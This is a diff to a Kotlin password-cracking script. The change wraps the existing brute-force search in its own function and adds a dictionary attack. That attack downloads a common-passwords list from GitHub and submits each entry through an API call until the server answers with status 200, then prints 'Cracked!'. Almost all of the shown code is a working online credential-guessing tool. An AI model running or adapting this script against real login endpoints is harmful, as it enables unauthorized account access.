@@ -2,15 +2,22 @@ import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.RequestBody.Companion.toRequestBody
 import java.io.IOException
+import java.net.URL
 
 fun main() {
+    val startTime = System.currentTimeMillis()
+    //brute()
+    dictionary(getListOfPasswords(), 0)
+    val elapsedTime = System.currentTimeMillis() - startTime
+    println("Elapsed time: $elapsedTime ms")
+}
+
+fun brute() {
     val characterSet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+"
 
     var found = false
     var length = 1  // Start with length 1
     val limit = 4
-
-    val startTime = System.currentTimeMillis()
 
     while (!found) {
         val current = CharArray(length)
@@ -24,9 +31,6 @@ fun main() {
             break
         }
     }
-
-    val elapsedTime = System.currentTimeMillis() - startTime
-    println("Elapsed time: $elapsedTime ms")
 }
 
 fun generateCombinations(set: CharArray, current: CharArray, position: Int): Boolean {
@@ -73,5 +77,17 @@ fun apiCall(password: String): Int {
     return statusCode
 }
 
+tailrec fun dictionary(list: List<String>, index: Int): String {
+    when { index == list.size -> return "No password matched." }
+    println("Trying: " + list[index])
+    when { apiCall(list[index]) == 200 -> return "Cracked! " + list[index] + " was the right password." }
+    return dictionary(list, index + 1)
+}
 
+fun getListOfPasswords(): List<String> {
+    val url = URL("https://raw.githubusercontent.com/dropbox/zxcvbn/master/data/passwords.txt")
+    val inputStream = url.openConnection().getInputStream()
+    val content = inputStream.bufferedReader().use { it.readText() }.split("\n")
 
+    return content.subList(0, content.lastIndex).map { it.substring(0, it.indexOf(" ") ) }
+}
